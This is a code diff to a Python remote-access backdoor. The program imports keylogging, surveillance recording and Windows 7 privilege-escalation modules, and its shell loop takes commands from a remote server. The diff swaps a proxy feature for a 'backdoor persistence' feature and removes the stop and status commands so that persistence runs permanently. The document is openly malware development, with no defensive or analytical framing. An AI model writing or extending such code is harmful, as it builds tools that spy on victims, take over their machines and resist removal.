@@ -17,7 +17,7 @@ from configuration import SERVER_IP, SERVER_PORT
 keylogger = None
 recorder = None  
 privilege_escalator = None
-proxy_manager = None
+persistence_manager = None
 
 import sys
 import os
@@ -31,7 +31,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
-from features.proxy import create_backdoor_proxy
+from features.persistence import create_backdoor_persistence
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -92,7 +92,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator, proxy_manager
+    global keylogger, recorder, privilege_escalator, persistence_manager
     
     while True:
         # Receive a command from the remote host
@@ -271,34 +271,17 @@ def shell():
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
-        # PROXY COMMANDS
-        elif command == 'start_proxy':
+        # PERSISTENCE COMMANDS
+        elif command == 'start_persistence':
             try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy()
-                success, msg = proxy_manager.start_proxy_operations()
-                reliable_send("Proxy: " + msg)
+                if persistence_manager is None:
+                    persistence_manager = create_backdoor_persistence()
+                success, msg = persistence_manager.start_persistence_operations()
+                reliable_send("Persistence: " + msg)
             except Exception as e:
-                reliable_send("Proxy start error: " + str(e))
+                reliable_send("Persistence start error: " + str(e))
                 
-        elif command == 'stop_proxy':
-            try:
-                if proxy_manager:
-                    success, msg = proxy_manager.stop_proxy_operations()
-                    reliable_send("proxy: " + msg)
-                else:
-                    reliable_send("No proxy active")
-            except Exception as e:
-                reliable_send("proxy stop error: " + str(e))
-
-        elif command == 'proxy_status':
-            try:
-                if proxy_manager is None:
-                    proxy_manager = create_backdoor_proxy()
-                status = proxy_manager.get_proxy_status()
-                reliable_send("Proxy Status: " + json.dumps(status, indent=2))
-            except Exception as e:
-                reliable_send("Proxy status error: " + str(e))
+        # Removed stop and status commands - persistence runs permanently
 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
